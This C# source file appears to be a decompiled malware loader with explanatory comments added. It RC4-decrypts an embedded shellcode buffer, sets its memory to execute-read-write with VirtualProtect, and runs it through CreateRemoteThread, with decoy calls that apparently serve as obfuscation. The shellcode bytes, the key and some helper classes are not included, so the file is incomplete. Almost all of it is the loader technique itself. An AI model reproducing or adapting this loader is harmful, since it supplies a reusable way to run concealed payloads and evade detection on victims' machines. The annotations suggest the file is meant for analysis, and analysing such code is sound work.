using System;
using System.Runtime.InteropServices;

namespace MSG
{
    internal class Program
    {
        // Importing the WaitForSingleObjectEx function from kernel32.dll
        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObjectEx(IntPtr hHandle, uint dwMilliseconds, bool bAlertable);

        // Importing the VirtualProtect function from kernel32.dll
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(ref byte lpAddress, int dwSize, uint flNewProtect, ref uint lpflOldProtect);

        // Importing the CreateRemoteThread function from kernel32.dll
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, ref byte lpStartAddress, byte[] lpParameter, uint dwCreationFlags, ref uint lpThreadId);

        // Entry point of the program
        private static void Main(string[] args)
        {
            // Create a new SplitSettings object (likely a custom class, not defined here)
            SplitSettings splitSettings = new SplitSettings(1, "Custom definitions");

            // Check if splitSettings object is created and call Status() method
            if (splitSettings != null)
            {
                splitSettings.Status();
            }

            // Create a random number generator
            Random random = new Random();

            // Encrypt data using the key and buffer (likely some user-provided data)
            EncryptData(MoveAngles.userBuffer, MoveAngles.key);

            // Generate a random number between 1 and 100 (doesn't seem to be used)
            random.Next(1, 101);

            // Old protection value for memory protection changes
            uint oldProtection = 0U;

            // Change the memory protection to allow code execution
            VirtualProtect(ref shellCode[0], shellCode.Length, 0x40U, ref oldProtection); // 0x40 is PAGE_EXECUTE_READWRITE

            // Re-encrypt the shell code (likely obfuscating it further)
            EncryptData(shellCode, shellKey);

            // Index of the shellcode to execute
            int shellcodeIndex = 392;

            // Thread ID for the created remote thread
            uint threadId = 0U;

            // Create a remote thread to execute the shellcode
            WaitForSingleObjectEx(CreateRemoteThread(IntPtr.MaxValue, IntPtr.Zero, 0U, ref shellCode[shellcodeIndex], MoveAngles.userBuffer, 0, ref threadId), uint.MaxValue, true);
        }

        // Method to encrypt data using a key (RC4 algorithm)
        public static void EncryptData(byte[] data, byte[] key)
        {
            byte[] S = new byte[256];
            byte[] K = new byte[256];

            // Initialize the key-scheduling algorithm (KSA)
            for (int i = 0; i < 256; i++)
            {
                S[i] = Convert.ToByte(i);
                K[i] = key[i % key.Length];
            }

            // Initial permutation of S array
            int j = 0;
            for (int i = 0; i < 256; i++)
            {
                j = (j + S[i] + K[i]) % 256;
                Swap(ref S[i], ref S[j]);
            }

            // Pseudo-random generation algorithm (PRGA)
            int index = 0;
            j = 0;
            for (int i = 0; i < data.Length; i++)
            {
                index = (index + 1) % 256;
                j = (j + S[index]) % 256;
                Swap(ref S[index], ref S[j]);

                int t = (S[index] + S[j]) % 256;
                data[i] ^= S[t];
            }
        }

        // Utility method to swap two bytes
        private static void Swap(ref byte a, ref byte b)
        {
            byte temp = a;
            a = b;
            b = temp;
        }

        // Static fields for storing shellcode and its encryption key
        public static byte[] shellKey;
        public static byte[] shellCode;
    }
}
